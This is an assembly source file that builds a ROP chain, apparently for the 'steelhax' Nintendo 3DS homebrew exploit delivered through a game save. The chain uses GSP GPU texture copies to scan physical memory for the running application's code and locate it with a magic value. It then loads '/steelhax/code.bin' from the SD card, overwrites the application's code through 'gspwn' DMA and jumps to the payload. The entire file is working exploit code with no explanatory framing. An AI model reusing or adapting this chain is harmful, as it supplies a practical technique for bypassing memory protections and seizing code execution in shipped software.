.nds

.include "steel_save/steel_constants.s"
.include "steel_save/steel_macros.s"

.create "build/rop.bin", STEEL_SECOND_ROP_BASE

rop:
	dereferenceAddressToR0 APPMEMTYPE
	compareR0 0x6
	storeToAddressIfEqual loop_src, 0x14000000 + 0x07C00000 - CODEBIN_SIZE ; n3ds

	loop:
		.word STEEL_GSPGPU_GXTRYENQUEUE_WRAPPER
			.word 0x4 ; SetTextureCopy
			loop_src:
				.word 0x14000000 + 0x04000000 - CODEBIN_SIZE ; o3ds
			loop_dest:
				.word LINEAR_BUFFER
			.word 0x1000 ; size
			.word 0xFFFFFFFF
			.word 0xFFFFFFFF
			.word 0x8
			.word 0x0
			.word 0x0
			.word 0xDEADBEEF
			.word 0xDEADBEEF
			.word 0xDEADBEEF
			.word 0xDEADBEEF
		svcSleepThread 100*1000, 0

		storeValue loop, STEEL_GSPGPU_GXTRYENQUEUE_WRAPPER

		dereferenceAddressToR0 loop_dest
		dereferenceR0ToR0
		;addToR0 0x100000000 - MAGICVAL	; 0x1A6BDF00
		compareR0 MAGICVAL

		storeToAddressIfEqual loop_pivot, STEEL_ROP_NOP

		dereferenceAddressToR0 loop_src
		; 0x17d4b000
		addToR0 0x1000
		storeR0 loop_src
		; 0x17d4c000

		dereferenceAddressToR0 loop_dest
		; 0x14000000
		addToR0 0x20
		storeR0 loop_dest
		; 0x14000020


		setR0 loop 				; 0x003B5088
		setR1 STEEL_ROP_NOP		; 0x003266E0
		loop_pivot:
			.word STEEL_ROP_MOV_SPR0_REGSTUFF_BX_R1
	loop_end:

	FSUSER_OpenFileDirectly file_handle, 0x0, ARCH_SDMC, PATH_EMPTY, empty_string, 0x1, PATH_ASCII, codepath, codepath_end-codepath, FS_OPEN_READ, 0x0
	FSFILE_GetSize file_handle, file_size
	FSFILE_Read file_handle, bytes_read, 0, 0, LINEAR_BUFFER, file_size
	FSFILE_Close file_handle
	
	flush_dcache LINEAR_BUFFER, 0x00100000
	gspwn loop_src, 0, LINEAR_BUFFER, 0x4000

	svcSleepThread 200*1000*1000, 0

	.word PAYLOAD_VA
	
file_handle:
	.word 0x0
empty_string:
	.word 0x0
file_size:
	.word 0x0
bytes_read:
	.word 0x0
codepath:
	.ascii "/steelhax/code.bin", 0
codepath_end:
.close